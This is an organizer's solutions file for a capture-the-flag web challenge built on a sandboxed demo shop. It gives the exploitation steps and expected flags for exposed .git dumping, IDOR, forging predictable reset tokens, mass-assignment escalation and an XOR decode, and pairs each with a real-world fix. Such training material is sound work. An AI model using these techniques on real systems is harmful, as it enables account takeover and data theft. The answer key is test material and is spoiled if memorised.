# SOLUTIONS.md — ORGANIZER ONLY

Do not distribute this file to participants. It is not served by the
application and is not reachable from the ShopDemo web app itself — it
only exists in this repository for organizers.

---

## Architecture overview

- **Stack:** Node.js + Express, in-memory data store (resets on every
  restart), JWT-based session cookie, bcrypt-hashed passwords.
- **Ports:** the app listens on `3000` only.
- **State:** everything (users, notes, audit log, password changes,
  privilege escalations) lives in memory in `src/data.js`. Restarting the
  container fully resets the challenge.
- **Sandboxing:** the Flag 7 "file preview" feature (`/api/admin/files*`)
  is backed by a fixed in-memory object (`virtualFiles` in `src/data.js`),
  **not** real filesystem access. There is no `fs.readFile` call anywhere
  in that code path, so path traversal payloads cannot reach the host
  filesystem — the worst case is a 404 inside the fake namespace.
- **Exposed git repo:** `git-source/.git` is a real, small, *unpacked* git
  repository (loose objects only — never run `git gc`/`git repack` on it,
  or dumping tools will need packfile support they may not have) served
  as static files at `/.git/`. It is entirely separate from the app's own
  source code; it exists purely as the in-fiction "leaked repo."

## Solve path summary

```
dirsearch/ffuf -> /healthcheck (Flag 1, hints at exposed .git)
        |
        v
/.git/ exposed -> dump with git-dumper or manual object walking
        |
        v
git log/show on recovered repo -> deleted config/debug.env (Flag 2)
        |
        v
DevTools/Burp on dashboard -> discover /api/notes/:id pattern
        |
        v
IDOR: /api/notes/3 (Charlie's note) -> Flag 3 + cipher key "northwind-7"
        |
        v
Password reset flow -> notice token = base64(username:epochMinute)
        |
        v
Forge reset token for "bob" -> log in as bob -> his note has Flag 4
        |         (also hints that /api/me accepts extra fields)
        v
PATCH /api/me with {"role":"admin"} -> mass assignment -> Flag 5 + admin session
        |
        v
/admin panel -> Audit Logs tab -> Flag 6 in a log entry
        |
        v
Admin file browser -> /app/data/internal/README.txt -> Flag 7
        |    (also references q3-report-DRAFT.enc, "cipher: XOR")
        v
Preview q3-report-DRAFT.enc -> base64 ciphertext
        |
        v
XOR-decode with key "northwind-7" (from Charlie's note) -> FINAL FLAG
```

---

## Flag 1 — Directory Discovery ⭐

**What participants should discover:** a hidden `200 OK` route not linked
from the UI or `robots.txt`.

**Vulnerability:** none in the security sense — this is a content-discovery
exercise. The lesson is that directory/endpoint enumeration finds things
that aren't advertised anywhere.

**Example request:**

```bash
dirsearch -u http://TARGET:3000
# or
ffuf -u http://TARGET:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

`/healthcheck` returns `200` and is present in most common wordlists
(dirsearch's default list and SecLists `common.txt` both include it).

**Tools:** dirsearch, ffuf, curl.

**Flag location:** response body of `GET /healthcheck`.

**Expected result:**

```
FLAG{d1r_search_f0und_th3_h34lthch3ck_p0rtal}
```

The response also contains an engineering "note" that mentions the repo
being checked out under the webroot at `/.git` — the intended nudge
toward Flag 2 (not mandatory; some participants will find `/.git` via
enumeration directly).

**Real-world fix:** don't rely on obscurity for internal endpoints; put
health/debug endpoints behind authentication or a separate internal-only
network path, and audit what's reachable from the public internet.

---

## Flag 2 — Git History ⭐⭐

**What participants should discover:** `/.git/` is served as static files
by the web server (classic misconfiguration: shipping the `.git` directory
to production).

**Vulnerability:** exposed version control metadata. Even though the
*current* checked-out files don't contain the flag, git's object database
retains every version of every file ever committed, including deleted
ones, until explicitly pruned.

**Example requests:**

```bash
git-dumper http://TARGET:3000/.git/ ./dumped-repo
# or manually:
curl http://TARGET:3000/.git/HEAD
curl http://TARGET:3000/.git/refs/heads/master
curl http://TARGET:3000/.git/objects/<aa>/<bb...>  # walk commit -> tree -> blob
```

Once dumped:

```bash
cd dumped-repo
git log --oneline
git log --all -p -- config/debug.env
# or
git show a0c9618:config/debug.env
```

**Tools:** git-dumper, git, curl, a small script (manual object walk) if
`git-dumper` isn't available.

**Flag location:** the flag was committed in `config/debug.env` in the
commit titled "Temporary debugging" and removed in "Remove debug
configuration". It is **not** present in any file checked out at `HEAD`.

**Expected result:**

```
FLAG{g1t_l0g_n3v3r_f0rg3ts_wh4t_y0u_d3l3t3d}
```

**Real-world fix:** never deploy the `.git` directory to a public webroot;
add build steps that exclude VCS metadata from deployment artifacts; treat
anything ever committed to git as permanently compromised once it's
exposed, and rotate/invalidate those secrets rather than just deleting the
file.

---

## Flag 3 — IDOR ⭐⭐

**What participants should discover:** `GET /api/notes/:id` doesn't check
that the requested note belongs to the logged-in user.

**Vulnerability:** Insecure Direct Object Reference (IDOR) / broken object
level authorization. The endpoint is discoverable by watching the
dashboard load a user's own notes in DevTools/Burp, then noticing the
`:id` path parameter.

**Example requests:**

```bash
curl -b cookies.txt http://TARGET:3000/api/notes/1   # alice's own note, fine
curl -b cookies.txt http://TARGET:3000/api/notes/3   # charlie's note -- leaks
```

**Tools:** browser DevTools Network tab, Burp Repeater, curl.

**Flag location:** note id `3`, owned by `charlie`.

**Expected result:**

```json
{"id":3,"title":"Charlie's private vault notes","body":"FLAG{n0t3_1d_1ncr3m3nt_l34ks_ch4rl1es_s3cr3ts}\n\nReminder to self: the quarterly export cipher key is \"northwind-7\". Don't lose it again like last time."}
```

This note also contains the cipher key needed for the FINAL FLAG.

**Real-world fix:** enforce object-level authorization server-side on
every request (`note.ownerId === session.userId`), not just in the UI;
consider non-guessable resource identifiers (UUIDs) as defense in depth
(not a substitute for authorization checks).

---

## Flag 4 — Authentication Weakness ⭐⭐⭐

**What participants should discover:** reset tokens use the predictable format
`base64(username:epochMinute)` — fully derivable, with no server-side
randomness or secret involved. The reset request response does not disclose the
token; participants must infer or reverse-engineer the format.

**Vulnerability:** predictable password reset token. A participant can infer
the token format and construct a valid token for **any** username for the
current minute without needing that user's inbox.

**Example requests:**

```bash
# Request a reset for yourself; the response intentionally contains no token
curl -X POST http://TARGET:3000/api/password-reset/request \
  -H "Content-Type: application/json" -d '{"username":"alice"}'

# After determining the format, construct a token for the target account

# Forge a token for bob at the current minute
python3 -c "import base64,time; print(base64.b64encode(f'bob:{int(time.time()//60)}'.encode()).decode())"

curl -X POST http://TARGET:3000/api/password-reset/confirm \
  -H "Content-Type: application/json" \
  -d '{"token":"<forged token>","newPassword":"pwned123"}'

curl -X POST http://TARGET:3000/api/login \
  -H "Content-Type: application/json" -d '{"username":"bob","password":"pwned123"}'
```

**Tools:** curl, Burp, a one-line Python/Node script, `base64` CLI.

**Organizer hint if participants stall:** the token contains only the username
and the current Unix time rounded to minutes, then uses an encoding rather than
encryption.

**Flag location:** the successful reset confirmation response for `bob`
contains the flag. Bob's own note contains a hint that `/api/me` accepts more
fields than it should (nudge toward Flag 5), but no longer contains Flag 4 so
the IDOR challenge cannot bypass the password-reset challenge.

**Expected result:**

```json
{"ok":true,"message":"Password updated for bob","flag":"FLAG{r3s3t_t0k3ns_n33d_r34l_3ntr0py_n0t_t1m3st4mps}"}
```

**Real-world fix:** generate reset tokens with a cryptographically secure
random generator, store a hash of the token server-side tied to a specific
user and single-use state, and never derive validity purely from
client-supplied, guessable input.

---

## Flag 5 — Privilege Escalation ⭐⭐⭐

**What participants should discover:** `PATCH /api/me` applies the entire
request body to the user record with no field allow-list, including
`role`.

**Vulnerability:** mass assignment. The dashboard UI only ever sends
`{"displayName": "..."}`, but the backend does `Object.assign(user,
req.body)`. Participants need to intercept the legitimate profile-save
request (Burp/DevTools) and add a `role` field.

**Example request:**

```bash
curl -b cookies.txt -c cookies.txt -X PATCH http://TARGET:3000/api/me \
  -H "Content-Type: application/json" \
  -d '{"displayName":"Alice","role":"admin"}'
```

**Tools:** Burp Suite Repeater/Proxy, browser DevTools, curl.

**Flag location:** returned directly in the JSON response when the role
transition from non-admin to `admin` succeeds. The session cookie is also
refreshed so admin access is immediate.

**Expected result:**

```json
{"ok":true,"profile":{"...","role":"admin"},"flag":"FLAG{m4ss_4ss1gnm3nt_m4d3_m3_4n_4dm1n}"}
```

**Real-world fix:** use an explicit allow-list of client-editable fields
server-side; never bind request bodies directly onto persistence models;
treat privilege-affecting fields (`role`, `isAdmin`, `permissions`, etc.)
as write-protected outside of dedicated admin-only endpoints.

---

## Flag 6 — Admin Panel ⭐⭐⭐

**What participants should discover:** after reaching admin, the Audit
Logs tab contains a flag buried among realistic log entries.

**Vulnerability:** none — this is an exploration/attention-to-detail
challenge testing whether participants actually read what they now have
access to, rather than immediately going back to hunting for bugs.

**Example request:**

```bash
curl -b cookies.txt http://TARGET:3000/api/admin/logs
```

**Tools:** browser (Admin panel -> Audit logs tab), curl.

**Flag location:** one entry in the audit log array (`detail` field).

**Expected result:**

```
FLAG{4ud1t_l0gs_r3m3mb3r_ev3ryth1ng_y0u_d1d}
```

The same log also contains the crucial clue for Flag 7 / the final flag:
a `BACKUP_EXPORT` entry referencing
`/app/data/internal/q3-report-DRAFT.enc` and that it uses an "XOR stream"
cipher.

**Real-world fix:** n/a (this flag is a discovery exercise, not a
vulnerability) — but in a real audit log, access controls and redaction
of sensitive values in logs would be worth reviewing regularly.

---

## Flag 7 — Admin-Only Vulnerability (Sandboxed File Read) ⭐⭐⭐⭐

**Design choice:** Option A (safe, sandboxed file preview) was used. The
"filesystem" is a fixed in-memory JS object (`virtualFiles` in
`src/data.js`) — there is **no** real path resolution against disk
anywhere in this code path, so this is safe to run in any environment.

**What participants should discover:** the admin file browser lists a
small set of "reports," one of which (`/app/data/internal/README.txt`)
contains a flag directly.

**Example requests:**

```bash
curl -b cookies.txt http://TARGET:3000/api/admin/files
curl -b cookies.txt "http://TARGET:3000/api/admin/files/preview?path=/app/data/internal/README.txt"
```

**Tools:** browser (Admin panel -> Reports/Files tab), curl, Burp.

**Flag location:** content of `/app/data/internal/README.txt` in the
virtual file namespace.

**Expected result:**

```
FLAG{s4ndb0x3d_f1l3_r34d_st1ll_l34ks_s3cr3ts}
```

This file also explicitly calls out `q3-report-DRAFT.enc` as the next
thing to look at, which feeds the final flag.

**Real-world fix (in the general case this challenge represents):**
strictly allow-list any file paths a preview/read feature can serve;
canonicalize and validate paths against a known-safe base directory;
never construct filesystem paths directly from user input.

---

## FINAL FLAG ⭐⭐⭐⭐⭐

**What participants should discover:** combining the cipher key from
Flag 3 (Charlie's note: `"northwind-7"`) with the encrypted artifact
referenced in Flag 6 (audit log) and served in Flag 7's file browser
(`/app/data/internal/q3-report-DRAFT.enc`) decrypts to the final flag.

**Chain required:**

1. IDOR (Flag 3) -> obtain cipher key `northwind-7`.
2. Admin access (Flag 5) -> reach the admin panel.
3. Audit log (Flag 6) -> learn the artifact's path and that it's
   "XOR stream" encrypted.
4. File preview (Flag 7 surface) -> fetch the base64 ciphertext at
   `/app/data/internal/q3-report-DRAFT.enc`.
5. Decrypt: base64-decode, then XOR each byte against the repeating key
   `northwind-7`.

**Example decode script:**

```python
import base64
ct = "<ciphertext from the file preview response>"
key = "northwind-7"
data = base64.b64decode(ct)
print(bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(data)).decode())
```

**Expected result:**

```
Congratulations, you chained every weakness together.
FLAG{ch41n1ng_s3v3n_bugs_1s_h0w_r34l_br34ch3s_h4pp3n}
```

**Real-world fix:** n/a directly (this is a puzzle-composition exercise),
but it mirrors how real breaches work: no single bug here is catastrophic
on its own, but chaining low/medium severity issues (info disclosure +
IDOR + weak auth + mass assignment) together produces a full compromise.
This is the core lesson to debrief participants on.

---

## Decoys and dead ends (for your reference)

- `/admin`, `/internal`, `/debug`, `/backup`, `/dev`, `/test`, `/staging`,
  `/api/admin`, `/console`, `/management`, `/private`, `/old`,
  `/phpmyadmin`, `/wp-admin`, `/.env`, `/server-status`, `/actuator` all
  return `403` (they exist and are "found," but are dead ends).
- `/api/version`, `/api/legacy/v1/status`, `/api/ping`,
  `/api/debug/echo` are real, harmless, `200`-returning endpoints with no
  further exploitation value.
- `/backup.zip`, `/db_backup_2025.sql` return `404` — bait for participants
  who assume common backup filenames exist.
- `/api/admin/config` contains a fake-looking `legacyApiKey` value that is
  never used anywhere — a red herring for anyone panning API responses for
  "secrets."
- `/api/admin/system-info` and `/api/admin/orders` are realistic-looking
  admin views with no exploitable content.
- `public/js/app.js` is an intentionally unused/dead analytics shim with
  misleading comments, included purely as source-review noise.
- `q3-report-DRAFT.enc`'s ciphertext will *not* decode meaningfully with
  any key other than `northwind-7` — this is deliberate to prevent
  brute-forcing without the actual clue chain.

## Pre-event checklist

- [ ] `docker compose up --build` starts cleanly and the app is reachable
      on port 3000.
- [ ] Restarting the container fully resets all state (passwords, roles,
      audit log growth from testing, etc. — everything is in-memory).
- [ ] `git-source/.git` still contains loose objects only (don't run
      `git gc` inside it, or `git-dumper`-style tools may fail against
      packed refs without additional handling).
- [ ] Confirm `SOLUTIONS.md` is not included in whatever you hand out to
      participants (it is never served by the app itself, but don't zip
      it into a participant bundle either).
- [ ] Spot-check each flag once end-to-end before the event, ideally from
      a clean container start.
